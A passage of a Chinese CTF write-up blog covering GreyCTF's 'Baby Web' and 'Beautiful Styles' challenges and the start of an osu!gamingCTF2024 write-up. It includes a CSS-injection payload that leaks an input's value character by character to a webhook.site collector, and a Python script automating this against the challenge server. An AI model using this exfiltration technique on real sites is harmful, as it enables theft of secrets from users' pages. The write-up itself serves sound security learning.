class="string">&quot;navbar navbar-expand-lg bg-body-tertiary&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;container-fluid&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">&quot;navbar-brand&quot;</span> <span class="attr">href</span>=<span class="string">&quot;/&quot;</span>&gt;</span>Baby Web<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">button</span> <span class="attr">class</span>=<span class="string">&quot;navbar-toggler&quot;</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> <span class="attr">data-bs-toggle</span>=<span class="string">&quot;collapse&quot;</span> <span class="attr">data-bs-target</span>=<span class="string">&quot;#navbarNav&quot;</span> <span class="attr">aria-controls</span>=<span class="string">&quot;navbarNav&quot;</span> <span class="attr">aria-expanded</span>=<span class="string">&quot;false&quot;</span> <span class="attr">aria-label</span>=<span class="string">&quot;Toggle navigation&quot;</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">&quot;navbar-toggler-icon&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;collapse navbar-collapse&quot;</span> <span class="attr">id</span>=<span class="string">&quot;navbarNav&quot;</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">ul</span> <span class="attr">class</span>=<span class="string">&quot;navbar-nav&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">&quot;nav-item&quot;</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">&quot;nav-link&quot;</span> <span class="attr">href</span>=<span class="string">&quot;/admin&quot;</span>&gt;</span>Admin<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">nav</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;container&quot;</span>&gt;</span></span><br><span class="line">      </span><br><span class="line">    </span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;container&quot;</span> <span class="attr">role</span>=<span class="string">&quot;doc-abstract&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">h2</span>&gt;</span>Admin Page<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">p</span>&gt;</span>This website is still under construction. I have completed the admin page where only I can access.<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">p</span>&gt;</span>Too bad my secret is not so easily given away<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> <span class="attr">class</span>=<span class="string">&quot;btn btn-primary&quot;</span> <span class="attr">data-bs-toggle</span>=<span class="string">&quot;modal&quot;</span> <span class="attr">data-bs-target</span>=<span class="string">&quot;#exampleModal&quot;</span> <span class="attr">hidden</span>=<span class="string">&quot;&quot;</span>&gt;</span></span><br><span class="line">        Super Secret Admin Button</span><br><span class="line">    <span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- Modal --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;modal fade&quot;</span> <span class="attr">id</span>=<span class="string">&quot;exampleModal&quot;</span> <span class="attr">tabindex</span>=<span class="string">&quot;-1&quot;</span> <span class="attr">aria-labelledby</span>=<span class="string">&quot;exampleModalLabel&quot;</span> <span class="attr">aria-hidden</span>=<span class="string">&quot;true&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;modal-dialog&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;modal-content&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;modal-header&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">h1</span> <span class="attr">class</span>=<span class="string">&quot;modal-title fs-5&quot;</span> <span class="attr">id</span>=<span class="string">&quot;exampleModalLabel&quot;</span>&gt;</span>Admin Modal<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> <span class="attr">class</span>=<span class="string">&quot;btn-close&quot;</span> <span class="attr">data-bs-dismiss</span>=<span class="string">&quot;modal&quot;</span> <span class="attr">aria-label</span>=<span class="string">&quot;Close&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;modal-body&quot;</span>&gt;</span></span><br><span class="line">                Wow!, you found the super secret admin button.</span><br><span class="line">                <span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">button</span> <span class="attr">hx-get</span>=<span class="string">&quot;/flag&quot;</span> <span class="attr">hx-swap</span>=<span class="string">&quot;outerHTML&quot;</span> <span class="attr">class</span>=<span class="string">&quot;btn btn-secondary&quot;</span>&gt;</span></span><br><span class="line">                    Here is an even more secret button.</span><br><span class="line">                <span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;modal-footer&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> <span class="attr">class</span>=<span class="string">&quot;btn btn-secondary&quot;</span> <span class="attr">data-bs-dismiss</span>=<span class="string">&quot;modal&quot;</span>&gt;</span>Close<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">async</span>=<span class="string">&quot;&quot;</span> <span class="attr">src</span>=<span class="string">&quot;https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js&quot;</span> <span class="attr">integrity</span>=<span class="string">&quot;sha384-YvpcrYf0tY3lHB60NNkmXc5s9fDVZLESaAA55NDzOxhy9GkcIdslK1eN7N6jIeHz&quot;</span> <span class="attr">crossorigin</span>=<span class="string">&quot;anonymous&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://unpkg.com/htmx.org@1.9.11&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>我们可以看到有个这个按钮</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> <span class="attr">class</span>=<span class="string">&quot;btn btn-primary&quot;</span> <span class="attr">data-bs-toggle</span>=<span class="string">&quot;modal&quot;</span> <span class="attr">data-bs-target</span>=<span class="string">&quot;#exampleModal&quot;</span> <span class="attr">hidden</span>=<span class="string">&quot;&quot;</span>&gt;</span></span><br><span class="line">        Super Secret Admin Button</span><br><span class="line">    <span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br></pre></td></tr></table></figure><p>里面有个<code>hidden=&quot;&quot;</code>属性</p><p>隐藏了这个按钮，我们只要把这个属性删掉，这个按钮就回来了</p><p>之后点击按钮得到flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grey&#123;0h_n0_mY_5up3r_53cr3t_4dm1n_fl4g&#125;</span><br></pre></td></tr></table></figure><h2 id="Beautiful-Styles-70-solves-100-points"><a href="#Beautiful-Styles-70-solves-100-points" class="headerlink" title="Beautiful Styles(70 solves &#x2F; 100 points)"></a><strong>Beautiful Styles</strong>(70 solves &#x2F; 100 points)</h2><p>给了一个html，然后让我们自己写css来修改这个html的样式，html代码如下</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>My Beautiful Site<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">link</span></span></span><br><span class="line"><span class="tag">      <span class="attr">href</span>=<span class="string">&quot;https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css&quot;</span></span></span><br><span class="line"><span class="tag">      <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span></span></span><br><span class="line"><span class="tag">      <span class="attr">integrity</span>=<span class="string">&quot;sha384-T3c6CoIi6uLrA9TneNEoa7RxnatzjcDSCmG1MXxSR1GAsXEV/Dwwykc2MPK8M2HN&quot;</span></span></span><br><span class="line"><span class="tag">      <span class="attr">crossorigin</span>=<span class="string">&quot;anonymous&quot;</span></span></span><br><span class="line"><span class="tag">    /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">href</span>=<span class="string">&quot;/uploads/&#123;&#123;submit_id&#125;&#125;.css&quot;</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;container&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">h1</span> <span class="attr">id</span>=<span class="string">&quot;title&quot;</span>&gt;</span>Welcome to my beautiful site<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">p</span> <span class="attr">id</span>=<span class="string">&quot;sub-header&quot;</span>&gt;</span></span><br><span class="line">        Here is some content that I want to share with you. An example can be</span><br><span class="line">        this flag:</span><br><span class="line">      <span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">&quot;flag&quot;</span> <span class="attr">value</span>=<span class="string">&quot;&#123;&#123; flag &#125;&#125;&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;container mt-4&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;/judge/&#123;&#123;submit_id&#125;&#125;&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Submit for judging&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span></span></span><br><span class="line"><span class="tag">      <span class="attr">src</span>=<span class="string">&quot;https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js&quot;</span></span></span><br><span class="line"><span class="tag">      <span class="attr">integrity</span>=<span class="string">&quot;sha384-C6RzsynM9kWDrMNeT87bh95OGNyZPhcTNXj1NW7RuBCsyN/o0jlpcV8Qyq46cDfL&quot;</span></span></span><br><span class="line"><span class="tag">      <span class="attr">crossorigin</span>=<span class="string">&quot;anonymous&quot;</span></span></span><br><span class="line"><span class="tag">    &gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>上传上去预览样式之后可以上传后台，由管理员检查，那么可以确定是xss了，目的应该是要我们读取</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">&quot;flag&quot;</span> <span class="attr">value</span>=<span class="string">&quot;&#123;&#123; flag &#125;&#125;&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure><p>中<code>&#123;&#123; flag &#125;&#125;</code>的内容，通过css来xss，直接看这篇文章(波兰语，看不懂机翻)</p><blockquote><p><a href="https://sekurak.pl/wykradanie-danych-w-swietnym-stylu-czyli-jak-wykorzystac-css-y-do-atakow-na-webaplikacje/">https://sekurak.pl/wykradanie-danych-w-swietnym-stylu-czyli-jak-wykorzystac-css-y-do-atakow-na-webaplikacje/</a></p></blockquote><p>简单解释一下就是</p><p>下面是匹配<code>input</code>标签中<code>value</code>值为abc的标签</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">input</span><span class="selector-attr">[value=<span class="string">&quot;abc&quot;</span>]</span> &#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>下面是匹配<code>input</code>标签中<code>value</code>值为的<strong>开头</strong>为a的标签</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">input</span><span class="selector-attr">[value^=<span class="string">&quot;a&quot;</span>]</span> &#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">background</span>: <span class="built_in">url</span>(<span class="string">https://webhook.site/886c0266-b6f5-4dc0-ae07-a9565f6b907a/</span>);会对地址进行访问</span><br></pre></td></tr></table></figure><p>结合一下</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">input</span><span class="selector-attr">[value^=<span class="string">&quot;g&quot;</span>]</span> &#123;</span><br><span class="line"><span class="attribute">background</span>: <span class="built_in">url</span>(<span class="string">https://webhook.site/886c0266-b6f5-4dc0-ae07-a9565f6b907a/g</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>就会匹配对应位置的字母，通过是否能接收到来进行盲注，下面是盲注代码，因为要两段访问获取，所以用bs4进行匹配一下，至于连续的爆破字符，需要通过接收站的api，过于麻烦就没有写，之后，题目提示</p><blockquote><p>Flag only consists of numbers and uppercase letters and the lowercase character <code>f</code> (the exception is the flag format of grey{.+})</p><p>Flag仅由数字、大写字母和小写字符<code>f</code>组成(例外情况是Flag格式为grey{.+})</p></blockquote><p>那么我们就能构造出盲注代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&quot;Host&quot;</span>: <span class="string">&quot;challs.nusgreyhats.org:33339&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Content-Length&quot;</span>: <span class="string">&quot;149&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Cache-Control&quot;</span>: <span class="string">&quot;max-age=0&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Upgrade-Insecure-Requests&quot;</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Origin&quot;</span>: <span class="string">&quot;http://challs.nusgreyhats.org:33339&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/x-www-form-urlencoded&quot;</span>,</span><br><span class="line">    <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Accept&quot;</span>: <span class="string">&quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Referer&quot;</span>: <span class="string">&quot;http://challs.nusgreyhats.org:33339/&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Accept-Encoding&quot;</span>: <span class="string">&quot;gzip, deflate&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Accept-Language&quot;</span>: <span class="string">&quot;zh-CN,zh;q=0.9&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Connection&quot;</span>: <span class="string">&quot;close&quot;</span>,</span><br><span class="line">&#125;</span><br><span class="line">arr=<span class="string">&quot;0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZf&#125;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> arr:</span><br><span class="line">    payload=<span class="string">&quot;grey&#123;X5S34RCH1fY0UC4NF1ND1T&#125;&quot;</span>+i</span><br><span class="line">    <span class="built_in">print</span>(payload)</span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&quot;css_value&quot;</span>: <span class="string">&#x27;input[value^=&quot;&#x27;</span>+payload+<span class="string">&#x27;&quot;]&#123;background:url(https://webhook.site/886c0266-b6f5-4dc0-ae07-a9565f6b907a/&#x27;</span>+payload+<span class="string">&#x27;);&#125;&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">print</span>(data)</span><br><span class="line">    url = <span class="string">&quot;http://challs.nusgreyhats.org:33339/submit&quot;</span></span><br><span class="line"></span><br><span class="line">    response = requests.post(url, headers=headers, data=data)</span><br><span class="line">    <span class="keyword">if</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">        soup = BeautifulSoup(response.text, <span class="string">&#x27;html.parser&#x27;</span>)</span><br><span class="line">        <span class="comment"># 查找&lt;form&gt;标签中的action属性值</span></span><br><span class="line">        form_action = soup.find(<span class="string">&#x27;form&#x27;</span>).get(<span class="string">&#x27;action&#x27;</span>)</span><br><span class="line">        judge_url = <span class="string">&#x27;http://challs.nusgreyhats.org:33339&#x27;</span> + form_action</span><br><span class="line">        judge_headers = &#123;</span><br><span class="line">            <span class="string">&#x27;Host&#x27;</span>: <span class="string">&#x27;challs.nusgreyhats.org:33339&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/x-www-form-urlencoded&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;Accept-Encoding&#x27;</span>: <span class="string">&#x27;gzip, deflate&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;Accept-Language&#x27;</span>: <span class="string">&#x27;zh-CN,zh;q=0.9&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;Connection&#x27;</span>: <span class="string">&#x27;close&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">        judge_data = &#123;&#125;</span><br><span class="line">        judge_response = requests.post(judge_url, headers=judge_headers, data=judge_data)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> judge_response.status_code == <span class="number">200</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Judge request successful.&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;judge request. Status code:&quot;</span>, judge_response.status_code)</span><br><span class="line">            <span class="built_in">print</span>(judge_response.text)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Failed to retrieve form action URL. Status code:&quot;</span>, response.status_code)</span><br></pre></td></tr></table></figure><p>每循环完一次，就检查接收站哪个收到了信息，然后添加到<code>payload</code>里进行下一次的爆破</p><p>得到flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grey&#123;X5S34RCH1fY0UC4NF1ND1T&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>osu!gamingCTF2024 wp</title>
      <link href="/2024/07/14/osu-gamingCTF2024-wp/"/>
      <url>/2024/07/14/osu-gamingCTF2024-wp/</url>
      
        <content type="html"><![CDATA[<blockquote><p>teamName: Ciallo</p><p>rank: #65</p><p>points: 3243</p><p>blockchain (0&#x2F;3 solved)-&gt; 0&#x2F;3243</p><p>crypto (6&#x2F;8 solved)-&gt; 744&#x2F;3243</p><p>forensics (1&#x2F;5 solved)-&gt; 117&#x2F;3243</p><p>misc (3&#x2F;9 solved)-&gt; 304&#x2F;3243</p><p>osint (1&#x2F;4 solved)-&gt;106&#x2F;3243</p><p>osu (5&#x2F;10 solved)-&gt; 550&#x2F;3243</p><p>pwn (3&#x2F;4 solved)-&gt; 422&#x2F;3243</p><p>reverse (4&#x2F;5 solved)-&gt; 533&#x2F;3243</p><p>web (4&#x2F;6 solved)-&gt; 467&#x2F;3243</p></blockquote><h2 id="mikufanpage-490-solves-104-points"><a href="#mikufanpage-490-solves-104-points" class="headerlink" title="mikufanpage(490 solves &#x2F; 104 points)"></a><strong>mikufanpage</strong>(490 solves &#x2F; 104 points)</h2><p> <a href="https://mikufanpage.web.osugaming.lol/">https://mikufanpage.web.osugaming.lol/</a></p><p>打开网页里面是一个图片的幻灯片循环播放，题目给了附件</p><p>题目目录是这样的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">│  app.js</span><br><span class="line">│  package-lock.json</span><br><span class="line">│  package.json</span><br><span class="line">│</span><br><span class="line">├─img</span><br><span class="line">│      flag.txt</span><br><span class="line">│      miku1.jpg</span><br><span class="line">│      miku2.jpg</span><br><span class="line">│      miku3.png</span><br><span class="line">│      miku4.png</span><br><span class="line">│      miku5.jpg</span><br><span class="line">│      miku6.png</span><br><span class="line">│      miku7.jpg</span><br><span class="line">│</span><br><span class="line">└─public</span><br><span class="line">        cube.mp3</span><br><span class="line">        dance.gif</span><br><span class="line">        favicon.ico</span><br><span class="line">        index.html</span><br></pre></td></tr></table></figure><p>主要看app.js</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>); </span><br><span class="line"><span class="keyword">const</span> path = <span class="built_in">require</span>(<span class="string">&#x27;path&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">express</span>(); </span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">PORT</span> = process.<span class="property">env</span>.<span class="property">PORT</span> ?? <span class="number">3000</span>;</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">use</span>(express.<span class="title function_">static</span>(path.<span class="title function_">join</span>(__dirname, <span class="string">&#x27;public&#x27;</span>)));</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">listen</span>(<span class="variable constant_">PORT</span>, <span class="function">(<span class="params">err</span>) =&gt;</span>&#123; </span><br><span class="line">    <span class="keyword">if</span>(!err) </span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;mikufanpage running on port &quot;</span>+ <span class="variable constant_">PORT</span>) </span><br><span class="line">    <span class="keyword">else</span> </span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Err &quot;</span>, err); </span><br><span class="line">&#125;); </span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&quot;/image&quot;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (req.<span class="property">query</span>.<span class="property">path</span>.<span class="title function_">split</span>(<span class="string">&quot;.&quot;</span>)[<span class="number">1</span>] === <span class="string">&quot;png&quot;</span> || req.<span class="property">query</span>.<span class="property">path</span>.<span class="title 